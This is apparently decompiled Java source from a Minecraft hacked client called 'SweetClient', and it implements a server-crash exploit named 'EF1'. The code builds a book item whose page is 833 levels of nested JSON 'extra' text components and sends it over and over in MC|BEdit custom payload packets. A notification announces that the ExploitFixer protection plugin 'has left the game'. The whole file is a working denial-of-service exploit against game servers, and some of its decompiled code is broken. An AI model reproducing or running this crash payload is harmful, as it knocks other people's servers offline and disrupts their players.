package SweetClient.exploits.impl;

import SweetClient.exploits.Exploit;
import SweetClient.exploits.ExploitInfo;
import SweetClient.helpers.ChatHelper;
import SweetClient.mods.notifications.Notification;
import SweetClient.mods.notifications.NotificationManager;
import SweetClient.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

@ExploitInfo(
   name = "EF1"
)
public class CrashEF1 extends Exploit {
   @Override
   public void execute(Object... var1) {
      int var2 = var1[0];
      NBTTagCompound var3 = new NBTTagCompound();
      NBTTagList var4 = new NBTTagList();
      StringBuilder var5 = new StringBuilder();
      var5.append("{");
      short var6 = 833;

      for(int var7 = 0; var7 < var6; ++var7) {
         var5.append("extra:[{");
      }

      for(int var12 = 0; var12 < var6; ++var12) {
         var5.append("text:ſ}],");
      }

      var5.append("text:ſ}");
      var4.appendTag(new NBTTagString(String.valueOf(var5)));
      var3.setString("author", mc.thePlayer.getName());
      var3.setString("title", "SweetClient");
      var3.setByte("resolved", (byte)1);
      var3.setTag("pages", var4);
      ItemStack var8 = new ItemStack(Items.writable_book);
      var8.setTagCompound(var3);
      PacketBuffer var9 = new PacketBuffer(Unpooled.buffer());
      var9.writeItemStackToBuffer(var8);
      long var10 = System.currentTimeMillis();
      NotificationManager.show(new Notification(NotificationType.INFO, "SweetClient", "ExploitFixer has left the game!", 4));
      ChatHelper.printMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), var1[0]));
      (new Thread(CrashEF1::lambda$execute$0)).start();
      ChatHelper.printMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - var10));
   }

   public static void lambda$execute$0(int var0, PacketBuffer var1) {
      try {
         for(int var2 = 0; var2 < var0; ++var2) {
            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", var1));
            Thread.sleep(2000L);
         }
      } catch (InterruptedException var3) {
      }

   }
}
